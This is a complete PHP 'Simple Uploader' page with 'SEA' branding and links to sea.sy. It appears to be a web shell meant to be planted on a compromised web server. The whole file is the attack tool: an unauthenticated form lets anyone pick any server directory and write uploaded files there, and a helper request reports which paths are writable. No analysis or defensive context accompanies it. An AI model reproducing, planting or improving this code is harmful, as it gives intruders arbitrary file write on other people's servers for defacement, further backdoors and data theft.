<?php
if(!$_GET){
?>
<html>
<head>
<title>SEA | Simple Uploader .</title>
<link rel="shortcut icon" href='http://sea.sy/style/css/images/sea_en.png' />
<meta http-equiv=Content-Type content=text/html; charset=UTF-8>
<style type="text/css">

.neon{
	color:blue;
	text-shadow: 0 0 5px red,0 0 10px red, 0 0 30px orange, 0 0 45px yellow, 0 0 60px red;
	}
.neon2{
	font-size:15px;
	color:lime;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.neon3{
	color:yellow;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.hacking{
	position:absolute;
	left:50px; font-size:35px;
	}
.like{
	border:4px double yellow;
	box-shadow:0px 2px 20px white;
	border-radius:10px;
	padding:9px;
	height:310px;}
	img{border:4px double yellow;
	box-shadow:0px 9px 15px white;
	border-radius:10px;
	opacity:0.75;
	-moz-opacity: 0.75;
	filter: alpha(opacity=75);
	}
a {
	text-decoration:none;}

</style>
<style>

@-webkit-keyframes tremer {
	0% {-webkit-transform: rotate(3deg);}
	50% {-webkit-transform: rotate(-3deg);}
	100% {-webkit-transform: rotate(3deg);}
	}
img:hover {
	-webkit-animation:tremer 0.2s linear infinite;
	-moz-animation:tremer 0.2s linear infinite;
	-o-animation:tremer 0.2s linear infinite;
	animation:tremer 0.2s linear infinite;
	}
</style>
<?php
$sh3llColor = "#0040FF";
function CSS($sh3llColor)
{
	$css =  "
	<style>
	BODY
	{
		FONT-FAMILY: Verdana; 
		margin: 2;
		color: #cccccc;
		background-color: #33363b;
	}
	sy  
	{
		color:".$sh3llColor.";
		font-size:7pt;
		font-weight: bold;
	}
	#Box
	{
	color:".$sh3llColor.";
	font-size:14px;
	background-color:#1C1C1C;
	font-weight:bold;
	width:500px;
	}
	tr 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #ffffff;
	}
	td 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #cccccc;
	}
	table 
	{
	BORDER:  #eeeeee  outset;
	BACKGROUND-COLOR: #1C1C1C;
	color: #cccccc;
	}
	input 
	{
	BORDER-RIGHT:  ".$sh3llColor." 1px solid;
	BORDER-TOP:    ".$sh3llColor." 1px solid;
	BORDER-LEFT:   ".$sh3llColor." 1px solid;
	BORDER-BOTTOM: ".$sh3llColor." 1px solid;
	BACKGROUND-COLOR: #333333;
	font: 9pt tahoma;
	color: #ffffff;
	}
	select 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #000000;
	font: 9pt tahoma;
	color: #CCCCCC;;
	}
	submit 
	{
	BORDER:  1px outset buttonhighlight;
	BACKGROUND-COLOR: #272727;
	width: 40%;
	color: #cccccc;
	}
	textarea 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #333333;
	color: #ffffff;
	}
	A:link {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:visited { COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:active {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:hover {color:blue;TEXT-DECORATION: none}
	</style>";
	return $css;
}
echo CSS($sh3llColor)
?>
<script>
function addUploadInput()
{document.getElementById('uploadInput').innerHTML += '<input type=\'file\' name=\'uploadfile[]\'>';	}	
	
function ajax() {
	var url = window.location.pathname;
	var filename = url.substring(url.lastIndexOf('/')+1);
	var url = filename+"?path="+document.getElementById('curDir').value;
	
	if (window.XMLHttpRequest) {
		xhr = new XMLHttpRequest();
	}
	else {
		if (window.ActiveXObject) {
			try {
				xhr = new ActiveXObject("Microsoft.XMLHTTP");
			}
			catch (e) { }
		}
	}
	if (xhr) {
		xhr.onreadystatechange = showContents;
		xhr.open("GET",url, true);
		xhr.send(null);
	}
}
function showContents() {
	if (xhr.readyState == 4) {
		if (xhr.status == 200) {
			document.getElementById("updateArea").innerHTML =  xhr.responseText;
		}
	}
}
</script>
</head>
<!-- Upload Files -->
<center>
<p><img src="http://sea.sy/style/css/images/sea_en.png" height="200" width="400" style="height:200px;">	
<form enctype="multipart/form-data" method="POST">
  <table width='800' height='72' border='0' id='Box'><tr>
<td width='30' height='21' style="background:<?php echo $sh3llColor; ?>">&nbsp;</td>
<td width="739" style='padding-left:10px;' >Upload Files 
<input type='button' value='+' id='addUpload' size='5' onclick='addUploadInput();'> 
<input type="text" id="curDir" name="curDir" size="60" onKeyUp="ajax();" value="<?php if($_POST){echo $_POST['curDir'];}else{echo getcwd();} ?>"  /></td>
<td width="17" style='padding-left:10px;' >
<span id="updateArea"></span>
</td>
  </tr>
    <tr><td height='45' colspan='3'>
<input type='file' name='uploadfile[]'><input type='file' name='uploadfile[]'>
<div id='uploadInput'></div>
<input type='submit' value='Upload Files' name='UploadNow'>
</td></tr></table></form>
<!-- End Of Upload Files -->
</center>
<?php
# --------------------------
#   Upload Files
#---------------------------
function filter($string)
{
	if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
	else{return $string;	}
}
if($_POST['UploadNow'])
{
	$uploadingDir = filter($_POST['curDir']);
	chdir($uploadingDir);

	echo "<center>";
	for ($i = 0; $i < count($_FILES['uploadfile']['name']); $i++)
	{
		if($_FILES['uploadfile']['name'][$i] != '')
		{
			if(function_exists('copy'))
			{$upload = @copy($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);}
			else
			{$upload = @move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);}
			if($upload) 
			{echo "<sy>The File  <font color='white'>".$_FILES['uploadfile']['name'][$i]."</font> Uploaded Successfully !</sy><br />";	}
			else 
			{ echo "<sy>The File  <font color='white'>".$_FILES['uploadfile']['name'][$i]."</font>  Can't Be Upload :( !</sy><br />";}
		}
	}		
	echo "</center>";
}
function footer()
{
	echo '<table bgcolor="#cccccc" width="100%"><tr>
	<td width="100%">
	<center><font color="gray" size="-2"><b>
	<font color="gray"></font><sy>   [
	</sy><font color="gray"></div><a href="http://www.sea.sy" target="_blank">www.sea.sy</a></font><sy> ]
	</sy></b>
	</td>
	</tr></table>
	</tbody>
	</body></html>
	';
}
footer();
}
else
{
	if($_GET['path'])
	{
		$path = trim($_GET['path']);
		if(get_magic_quotes_gpc() != 0){$path =  stripslashes($path);	}
		if(is_writable($path))
		{echo "<font color='green'>√</font>";}
		else
		{echo "<sy>X</sy>";}
	}
}
?>
